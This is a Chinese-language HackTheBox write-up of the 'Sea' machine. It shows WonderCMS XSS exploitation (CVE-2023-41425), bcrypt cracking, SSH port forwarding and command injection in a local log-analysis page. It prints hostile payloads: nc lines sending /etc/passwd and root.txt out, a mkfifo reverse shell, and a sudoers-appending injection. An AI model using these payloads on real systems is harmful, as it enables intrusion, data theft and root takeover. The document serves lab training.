---
tags:
  - HTB/Easy
  - HTB/Linux
---
## Summary

...

### Relevant Skills

- nmap
- CVE
- 密码暴破
- 端口转发
- ……

### Attack Path Overview

![attack-path](./../attackpath/HTB-template.png){ width='500' }


## External Recon - nmap

自用扫描脚本：[工作流](https://github.com/TimeLess613/workflow-scan4HTB/blob/main/workflow-scan4HTB.sh)  
`curl -s https://raw.githubusercontent.com/TimeLess613/workflow-scan4HTB/main/workflow-scan4HTB.sh | sudo bash -s <HTB-MachineName> <HTB-IP>`

开放端口：
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

## 攻击路径规划·漏洞分析

常规简单靶机，22端口SSH的版本较新，优先度放低。先看80端口的Web。


## 80端口

- robots.txt：无
- .git/config：无
- 网页信息：找到`http://sea.htb/contact.php`，先将 `sea.htb` 加入hosts。
- 网页源码：无特别发现。
- 网页功能：bike比赛/游戏的介绍与参赛申请？需要在 `http://sea.htb/contact.php` 发送申请。感觉可能有XSS，因为管理员肯定要处理这个申请（记得以前打哪个靶机也是这个业务思路）。
- 子域枚举：枚举清单里的所有子域都返回200的样子，终止枚举。
- 目录枚举：在 `http://sea.htb/themes/bike/` 下面有几个有意思的文件。


### 通过目录枚举结果找到WonderCMS

关于 `http://sea.htb/themes/bike/` 的目录枚举结果：
```
└─$ cat dirEnum_sea.htb.txt | grep bike
301      GET        7l       20w      235c http://sea.htb/themes/bike => http://sea.htb/themes/bike/
200      GET       21l      168w     1067c http://sea.htb/themes/bike/LICENSE
301      GET        7l       20w      239c http://sea.htb/themes/bike/css => http://sea.htb/themes/bike/css/
301      GET        7l       20w      239c http://sea.htb/themes/bike/img => http://sea.htb/themes/bike/img/
200      GET        1l        9w       66c http://sea.htb/themes/bike/summary
500      GET        9l       15w      227c http://sea.htb/themes/bike/theme.php
200      GET        1l        1w        6c http://sea.htb/themes/bike/version
```

看看其中的信息：
```
└─$ curl http://sea.htb/themes/bike/LICENSE
MIT License

Copyright (c) 2019 turboblack
<SNIP>


└─$ curl http://sea.htb/themes/bike/version
3.2.0

└─$ curl http://sea.htb/themes/bike/summary
Animated bike theme, providing more interaction to your visitors.
```

根据Copyright的 `turboblack` 以及这个bike主题，谷歌一下 `turboblack bike theme` 发现**WonderCMS**。

## Initial Access

根据上面的信息，谷歌 `"wondercms" theme "bike" 3.2 exploit` 等没搜到什么漏洞，最终尝试最宽松的搜索 `wondercms exploit` 发现github的这个：[CVE-2023-41425](https://github.com/prodigiousMind/CVE-2023-41425)。里面说 `Wonder CMS v.3.2.0 thru v.3.4.2`，但是也不知道之前发现的版本信息3.2.0是指bike主题还是WonderCMS本身……姑且看看这个exp的内容。

### PoC (CVE-2023-41425)

试着跑了一下上面github中的exp脚本：`python exploit.py http://sea.htb/ 10.10.14.3 1234`，发送payload后没有反应……本身也没理解脚本说的第一个参数 `URL: where WonderCMS is installed (no need to know the password)`，还想着为什么提到不用密码？还是得仔细看看脚本。

注意到payload生成的部分有个 `loginURL` 字符串被替换了，但是我之前第一个参数没有 `loginURL`。于是试着访问了一下 `http://sea.htb/loginURL`  
竟然出现了登陆界面：
![[HTB-Sea-loginURL.png]]

原来github说的不用密码是这个意思啊……那么我的第一个参数应该用这个URL。

还有个问题，看生成的 `xss.js` 中似乎在加载一个反弹shell（安装zip模块），不过靶机应该无法直接访问github，所以需要将 `urlRev` 改为自己的IP（端口建议直接8000）。

生成payload发送：
![[HTB-Sea-payload.png]]

收到响应，应该是管理员点击了表单中的网址，然后获取了我们本地的 `xss.js`，但是反弹shell没有反应。就是 `xss.js` 的内容有问题？
![[HTB-Sea-payload2.png]]

注意到几个URL的拼接用了 `urlWithoutLogBase`，其赋值是用的 `new URL(urlWithoutLog).pathname`，猜测是用相对路径进行访问，即当没有指定协议和主机名时默认使用当前页面的主机名和协议（在JavaScript中的话）。但是用浏览器的console跑了一下，显示 `urlWithoutLogBase` 是一个斜杠，那么js脚本中的URL拼接就会有点问题。比如 `urlWithoutLogBase+"/?installModule` 就变成 `//?installModule`。

![[HTB-Sea-debug-urlWithoutLogBase.png]]

参照[CVE-2023-41425](https://github.com/prodigiousMind/CVE-2023-41425)图中的访问log，其URL路径本身是 `/wondercms/loginURL`，对应到 `urlWithoutLogBase` 应该是 `/wondercms`，针对我们这次目标的情况，估计是可以直接让这个变量为空，即：`var urlWithoutLogBase = "";`。  
再次发送payload，成功获取反弹shell：
```
└─$ nc -lvnp 1234
listening on [any] 1234 ...
<SNIP>
$ id                                                                                  
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                 
$ ip a                                                                                
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000                                                                                 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00                             
    inet 127.0.0.1/8 scope host lo                                                    
       valid_lft forever preferred_lft forever                                        
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000                                                                               
    link/ether 00:50:56:b9:6a:55 brd ff:ff:ff:ff:ff:ff                                
    inet 10.10.11.28/23 brd 10.10.11.255 scope global eth0                            
       valid_lft forever preferred_lft forever 
```


### Internal Recon with www-data


```
www-data@sea:/$ ls -al /home/
total 16
drwxr-xr-x  4 root root 4096 Jul 30 12:58 .
drwxr-xr-x 19 root root 4096 Feb 21 01:15 ..
drwxr-xr-x  4 amay amay 4096 Aug  1 12:22 amay
drwxr-x---  4 geo  geo  4096 Aug  1 12:13 geo
www-data@sea:/$ cat /etc/passwd
<SNIP>
amay:x:1000:1000:amay:/home/amay:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
geo:x:1001:1001::/home/geo:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false

www-data@sea:/home/amay$ ss -notpl
State               Recv-Q               Send-Q                             Local Address:Port                              Peer Address:Port              Process              
LISTEN              0                    10                                     127.0.0.1:57743                                  0.0.0.0:*                                      
LISTEN              0                    511                                      0.0.0.0:80                                     0.0.0.0:*                                      
LISTEN              0                    4096                                   127.0.0.1:8080                                   0.0.0.0:*                                      
LISTEN              0                    4096                               127.0.0.53%lo:53                                     0.0.0.0:*                                      
LISTEN              0                    128                                      0.0.0.0:22                                     0.0.0.0:*                                      
LISTEN              0                    128                                         [::]:22                                        [::]:*                                      
www-data@sea:/home/amay$ curl -I 127.0.0.1:8080
HTTP/1.0 401 Unauthorized
Host: 127.0.0.1:8080
Date: Thu, 15 Aug 2024 11:14:36 GMT
Connection: close
X-Powered-By: PHP/7.4.3-4ubuntu2.23
WWW-Authenticate: Basic realm="Restricted Area"
Content-type: text/html; charset=UTF-8
```

进行一波基础的信息收集，发现有本地开放端口8080，访问了了一下发现要认证，那继续探索是否有凭据信息。

找到一个config文件中的密码，但是没有用户名。以及看其中的 `"login": "loginURL"` 和 `lastLogins` 提到从 `127.0.0.1` 登录，那么可能之前的8080端口的认证就是之前loginURL页面用的密码：
```
www-data@sea:/var/www/sea/data$ ls -l
total 40
-rwxr-xr-x 1 www-data www-data 29235 Aug 15 11:08 cache.json
-rwxr-xr-x 1 www-data www-data  2891 Aug 15 11:15 database.js
drwxr-xr-x 2 www-data www-data  4096 Aug 15 11:08 files
www-data@sea:/var/www/sea/data$ grep -i pass database.js 
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",

www-data@sea:/var/www/sea/data$ head -n15 database.js 
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
        "lastLogins": {
            "2024\/08\/15 11:15:33": "127.0.0.1",
            "2024\/08\/15 11:11:33": "127.0.0.1",
<SNIP>
```


### 暴破密码

用john和hashcat都识别不了，原来原始字符串中包含了转义符，将其删除后进行暴破
```
└─$ echo -n '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' > hash-2y 

└─$ john  --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash-2y    
<SNIP>
mychemicalromance (?)     
<SNIP>
Session completed. 
```

暴破成功，在 `loginURL` 页面输入密码后跳回首页，没有任何不同。想到尝试切换用户，至于哪个用户，其实家目录的权限已经给了提示，于是直接尝试有user flag的 `amay`：
```
www-data@sea:/home/amay$ su - amay
Password: 
amay@sea:~$ id
uid=1000(amay) gid=1000(amay) groups=1000(amay)
```


## flag: user

```
amay@sea:~$ cat user.txt 
087a7<SNIP>cd510
```


## Privilege Escalation

### Internal Recon with amay

基础信息收集一把梭：

- IP、端口：同上
- 用户家目录的隐藏文件：无
- `sudo -l`：没有sudo可执行
- SUID：无特别发现
- cron：`crontab -l`，`ls /etc/cron*`，无特别发现

### SSH tunnel

没发现什么有用的信息，思路再次回到本地端口8080，先配置端口转发（kali的8080端口由于开了Burp所以映射到8081）：
```
└─$ ssh -fNT -L 8081:127.0.0.1:8080 amay@10.10.11.28 
<SNIP>
└─$ ss -noptl                                       
State           Recv-Q          Send-Q                         Local Address:Port                      Peer Address:Port          Process                                      
LISTEN          0               128                                127.0.0.1:8081                           0.0.0.0:*              users:(("ssh",pid=2208024,fd=5))
<SNIP>
```


### 本地端口8080

看看目标的本地8080端口到底是个啥，浏览器访问 `127.0.0.1:8081` 后弹出认证框，输入amay的凭据（`amay:mychemicalromance`）后进入如下画面：
![[HTB-Sea-8080.png]]

点击 `Analyze` 在Burp可以发现是个POST请求：
```
POST / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: http://127.0.0.1:8081
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Connection: close
Referer: http://127.0.0.1:8081/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&analyze_log=
```

将payload改为 `log_file=/etc/passwd&analyze_log=` 后相应如下（payload仅用一个参数 `log_file=/etc/passwd` 的话似乎失效，没有返回特别的内容）：
![[HTB-Sea-8080-payload.png]]

有点像LFI，不过可以发现其获取的 `/etc/passwd` 不是输出所有内容，且用户id111之后没有112和113，似乎过滤了什么内容才输出的。

而其本身获取的log文件也需要root级别的权限才能访问，所以此控制台的权限很高：
```
amay@sea:~$ ls -al /var/log/
total 1480
drwxrwxr-x  11 root      syslog            4096 Aug 15 13:13 .
drwxr-xr-x  14 root      root              4096 Feb 21 01:26 ..
drwxr-x---   2 root      adm               4096 Aug 15 13:13 apache2
```


尝试直接获取 `/root/root.txt` 发现不行，甚至连 `/home/amay/user.txt` 都不行。有点迷……

#### 命令注入

kali开启`nc`监听，尝试发送payload `log_file=/home/amay/user.txt;nc+10.10.14.47+80+<+/etc/passwd&analyze_log=`，能收到整个 `/etc/passwd` 的内容！看来是命令注入。



## flag: root


发送payload：`log_file=/home/amay/user.txt;nc+10.10.14.47+80+<+/root/root.txt&analyze_log=`

```
└─$ nc -lvnp 8088
listening on [any] 8088 ...
connect to [10.10.14.47] from (UNKNOWN) [10.10.11.28] 43518
a24c9<SNIP>4595
```



---

## 总结·后记

2024/08/15

……

### 关于识别WonderCMS的其他方法

#### 方法2 - theme的默认图片

首页抬头的图片，其路径为：`http://sea.htb/themes/bike/img/velik71-new-logotip.png`，猜测是bike主题中的默认图片，于是谷歌图片名 `velik71-new-logotip` 能找到和上面一样的关于**WonderCMS**的讨论网站。

#### 方法3 - README.md

参考大佬视频，感觉这是最靠谱的方法。很可惜目录枚举由于没有想过枚举 `.md` 而错过了这个，且在枚举出 `LICENSE` 的情况下也没想起来手动试一下访问 `http://sea.htb/themes/bike/README.md`，实际上可得到以下信息：
```
└─$ curl http://sea.htb/themes/bike/README.md
# WonderCMS bike theme

## Description
Includes animations.

## Author: turboblack

## Preview
![Theme preview](/preview.jpg)

## How to use
1. Login to your WonderCMS website.
2. Click "Settings" and click "Themes".
3. Find theme in the list and click "install".
4. In the "General" tab, select theme to activate it.
```

### sea项目

中途有几次发送XSS payload但是返回 `Failed to submit form. Please try again later.`，结合进入靶机后有几次尝试写入文件都因为磁盘空间不足而失败的经历，看来是同样的原因让 `file_put_contents` 函数执行失败所以报错。

```
www-data@sea:/$ cat /var/www/sea/.htaccess 
Options -Indexes
ServerSignature Off
RewriteEngine on
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.+)$ index.php?page=$1 [QSA,L]
RewriteRule database.js - [F]
RewriteRule cache.json - [F]
www-data@sea:/$ cat /var/www/sea/contact.php 
<!DOCTYPE html>
<html lang="en">

<SNIP>

<body>


 <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $name = $_POST["name"];
        $email = $_POST["email"];
        $age = $_POST["age"];
        $country = $_POST["country"];
        $website = $_POST["website"];
        $message = "";
        $content = "Name: $name\nEmail: $email\nAge: $age\nCountry: $country\nWebsite: $website\n";

        $file_path = "/var/www/sea/messages/" . date("Y-m-d") . ".txt";

        if (file_put_contents($file_path, $content, FILE_APPEND) !== false) {
            $message = "<p style='color: green;'>Form submitted successfully!</p>";
        } else {
            $message = "<p style='color: red;'>Failed to submit form. Please try again later.</p>";
        }
    }
    ?>


    <div id="background">
        <div id="stars"></div>
    </div>
    <div id="container">
        <h1>Competition registration - Sea</h1>
        <?php echo $message; ?>

        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
            <label for="name">Name:</label>
            <input type="text" id="name" name="name" required>

            <label for="email">Email:</label>
            <input type="email" id="email" name="email" required>

            <label for="age">Age:</label>
            <input type="number" id="age" name="age" required>

            <label for="country">Country:</label>
            <input type="text" id="country" name="country" required>

            <label for="website">Website:</label>
            <input type="text" id="website" name="website">

            <input type="submit" value="Submit">
        </form>
    </div>
</body>
</html>
```


### 关于root shell

当尝试用payload `log_file=/home/amay/user.txt;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.14.47%204444%20%3E%2Ftmp%2Ff&analyze_log=` 时，确实能获得root shell，但是会立马断开：
```
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.47] from (UNKNOWN) [10.10.11.28] 48044
bash: cannot set terminal process group (2834): Inappropriate ioctl for device
bash: no job control in this shell
root@sea:~/monitoring#
```


尝试其他方法，先看看命令注入能做到什么程度。发送payload `log_file=/home/amay/user.txt;touch+/home/amay/poc&analyze_log=`，可以发现root创建的文件：
```
amay@sea:~$ ll
<SNIP>
-rw-r--r-- 1 root root    0 Aug 15 15:37 poc
-rw-r--r-- 1 amay amay  807 Feb 25  2020 .profile
drwx------ 2 amay amay 4096 Feb 21 01:18 .ssh/
-rw-r----- 1 root amay   33 Aug 15 14:47 user.txt
```

那么添加amay到sudoers：`log_file=/home/amay/user.txt;echo+'amay++++ALL=(ALL:ALL)+NOPASSWD:+ALL'+>>+/etc/sudoers&analyze_log=`

获得root shell：
```
amay@sea:~$ sudo -l
Matching Defaults entries for amay on sea:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User amay may run the following commands on sea:
    (ALL : ALL) NOPASSWD: ALL
amay@sea:~$ sudo bash
root@sea:/home/amay# id
uid=0(root) gid=0(root) groups=0(root)
root@sea:/home/amay# cd /root/
root@sea:~# ls
monitoring  root.txt  scripts
```


### 关于命令注入的网页

拿到root shell之后顺便收集了一下最后命令注入的网页相关源码：
```bash
root@sea:~# ls scripts/
monitoring-watchdog.sh
root@sea:~# cat scripts/monitoring-watchdog.sh 
#!/bin/bash

while true; do
    status_site=$(/usr/bin/curl -s --max-time 2 http://127.0.0.1:8080)

    if [ $? -ne 0 ]; then
        /usr/bin/systemctl restart monitoring.service
    fi
    sleep 3
done
root@sea:~# ls monitoring/
index.php
root@sea:~# cat monitoring/index.php 
<?php
$valid_users = array("amay" => "mychemicalromance");

function authenticate($valid_users) {
    if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) || !isset($valid_users[$_SERVER['PHP_AUTH_USER']]) || $valid_users[$_SERVER['PHP_AUTH_USER']] !== $_SERVER['PHP_AUTH_PW']) {
        header('WWW-Authenticate: Basic realm="Restricted Area"');
        header('HTTP/1.0 401 Unauthorized');
        echo 'Unauthorized access';
        exit;
    }
}

authenticate($valid_users);
?>


<!DOCTYPE html>
<html lang="en">

<SNIP>

<body>
    <div class="container">
        <h1>System Monitor(Developing)</h1>

        <div class="status">
            <h2>Disk Usage</h2>
            <?php
            $disk_usage = system('df -h / | grep "/"');
            $disk_usage_values = explode(" ", $disk_usage);
            $used_space = $disk_usage_values[12];
            $total_space = $disk_usage_values[8];
            ?>
            <p>Used: <?php echo $used_space; ?></p>
            <p>Total: <?php echo $total_space; ?></p>
        </div>

        <div class="status">
            <h2>System Management</h2>
            <form action="" method="post">
                <button type="submit" name="clean_apt" class="button">Clean system with apt</button>
                <button type="submit" name="update_system" class="button">Update system</button>
                <button type="submit" name="clear_auth_log" class="button">Clear auth.log</button>
                <button type="submit" name="clear_access_log" class="button">Clear access.log</button>
            </form>
            <?php
            if ($_SERVER["REQUEST_METHOD"] == "POST") {
                if (isset($_POST['clean_apt'])) {
                    $output = system('sudo apt clean');
                    echo "<p class='success'>$output</p>";
                }
                if (isset($_POST['update_system'])) {
                    $output = system('sudo apt update -y && sudo apt upgrade -y');
                    echo "<p class='success'>$output</p>";
                }
                if (isset($_POST['clear_auth_log'])) {
                    $output = system('sudo truncate -s 0 /var/log/auth.log');
                    echo "<p class='success'>$output</p>";
                }
                if (isset($_POST['clear_access_log'])) {
                    $output = system('sudo truncate -s 0 /var/log/apache2/access.log');
                    echo "<p class='success'>$output</p>";
                }
            }
            ?>
        </div>

        <div class="status">
            <h2>Analyze Log File</h2>
            <form action="" method="post">
                <select name="log_file">
                    <option value="/var/log/apache2/access.log">access.log</option>
                    <option value="/var/log/auth.log">auth.log</option>
                </select>
                <button type="submit" name="analyze_log" class="button">Analyze</button>
            </form>
            <?php
            if (isset($_POST['analyze_log'])) {
                $log_file = $_POST['log_file'];

                $suspicious_traffic = system("cat $log_file | grep -i 'sql\|exec\|wget\|curl\|whoami\|system\|shell_exec\|ls\|dir'");
                if (!empty($suspicious_traffic)) {
                    echo "<p class='error'>Suspicious traffic patterns detected in $log_file:</p>";
                    echo "<pre>$suspicious_traffic</pre>";
                } else {
                    echo "<p>No suspicious traffic patterns detected in $log_file.</p>";
                }
            }
            ?>
        </div>

    </div>
</body>
</html>
```

命令注入的位置在：`system("cat $log_file | grep -i 'sql\|exec\|wget\|curl\|whoami\|system\|shell_exec\|ls\|dir'");`

原来是用grep过滤，之前直接获取 `/etc/passwd` 时内容不完全看来是因为 `grep` 了 `system`。



### 关于xss的触发

可以在geo用户的家目录中发现这个脚本，每分钟触发：
```bash
root@sea:/home/geo# cat scripts/contact.py 
import os
import asyncio
from pyppeteer import launch
import requests

async def XSS(page, url):
    login_url = 'http://127.0.0.1/loginURL'
    headers = {'host': 'sea.htb'}
    data = {'password': 'mychemicalromance'}

    response = requests.post(login_url, data=data, headers=headers, allow_redirects=False)
    cookie = response.headers.get('Set-Cookie')
    cookie = cookie.split(';')
    cookie = cookie[1].split('=')[2]
    cookie = {'name': 'PHPSESSID', 'value': cookie, 'domain': 'sea.htb'}
    await page.setCookie(cookie)
    try:    
        await page.goto(url)
        content = await page.content()
    except Exception as e:
        print(f"[!] Failed at goto. {e}")

async def main():
    browser = await launch(headless=True, args=['--no-sandbox'])
    page = await browser.newPage()
    directory_path = "/var/www/sea/messages/"

    while True:
        files = os.listdir(directory_path)
        message_files = [file for file in files if file.endswith(".txt")]

        urls = []
        for file in message_files:
            try: 
                file_path = os.path.join(directory_path, file)
                with open(file_path, 'r') as f:
                    lines = f.readlines()
                    for line in lines:
                        if line.startswith("Website:"):
                            website = line.strip().split(": ")[1]
                            urls.append(website)
            except:
                print(f"[!] Failed to process {file}")
    
        for url in urls:
            try:
                await XSS(page, url)
            except:
                print("[!] Failed at XSS")

        os.system(f"rm -f {directory_path}*")
        await asyncio.sleep(60)

asyncio.get_event_loop().run_until_complete(main())
```
